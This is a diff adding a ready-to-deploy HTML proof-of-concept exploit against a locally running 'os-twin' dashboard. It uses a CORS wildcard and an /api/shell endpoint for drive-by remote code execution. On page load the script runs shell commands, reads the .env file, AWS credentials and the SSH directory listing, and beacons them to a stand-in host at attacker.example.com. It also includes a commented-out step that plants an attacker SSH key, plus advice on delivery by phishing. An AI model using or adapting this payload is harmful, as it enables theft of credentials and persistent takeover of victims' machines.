@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<!--
+  C2 — Drive-by RCE via CORS Wildcard + /api/shell
+  Target: dashboard/api.py:108-113 + dashboard/routes/system.py:166-169
+
+  Attack chain:
+    1. Victim visits this page while os-twin dashboard runs on localhost:9000
+    2. Browser sends cross-origin POST to http://localhost:9000/api/shell
+    3. CORS wildcard (allow_origins=["*"]) permits the request and exposes the response
+    4. JavaScript reads RCE output and exfiltrates it to attacker-controlled server
+
+  Deployment:
+    - Host on any web server (python3 -m http.server 8080)
+    - Send URL to victim (phishing email, malicious ad, etc.)
+    - Monitor /collect endpoint for exfiltrated data
+
+  No interaction required beyond page load.
+-->
+<html>
+<head><title>Loading...</title></head>
+<body>
+<pre id="out">Connecting...</pre>
+<script>
+// Attacker-controlled collection endpoint — replace before deployment
+const EXFIL = "https://attacker.example.com/collect";
+const TARGET = "http://localhost:9000";
+
+async function rce(cmd) {
+  const r = await fetch(`${TARGET}/api/shell?command=${encodeURIComponent(cmd)}`, {
+    method: "POST",
+    // No credentials, no special headers — simple CORS request
+    // CORS wildcard allows any origin to read the response
+  });
+  return r.json();
+}
+
+async function pwn() {
+  const out = document.getElementById("out");
+
+  // Stage 1: Confirm RCE
+  const id   = await rce("id");
+  const host = await rce("hostname");
+  const cwd  = await rce("pwd");
+
+  // Stage 2: Exfiltrate secrets
+  const env  = await rce("cat ~/.ostwin/.env 2>/dev/null || echo NO_ENV");
+  const ssh  = await rce("ls ~/.ssh/ 2>/dev/null");
+  const aws  = await rce("cat ~/.aws/credentials 2>/dev/null || echo NO_AWS");
+
+  const payload = { id: id.stdout, host: host.stdout, cwd: cwd.stdout,
+                    env: env.stdout, ssh: ssh.stdout, aws: aws.stdout };
+
+  out.textContent = JSON.stringify(payload, null, 2);
+
+  // Stage 3: Beacon to attacker server (fire-and-forget; ignore CORS on exfil endpoint)
+  navigator.sendBeacon(EXFIL, JSON.stringify(payload));
+
+  // Stage 4: Persist — drop SSH key for persistent access
+  // Uncomment to weaponise:
+  // await rce("mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA...ATTACKER_KEY' >> ~/.ssh/authorized_keys");
+}
+
+pwn().catch(e => document.getElementById("out").textContent = "Error: " + e);
+</script>
+</body>
+</html>
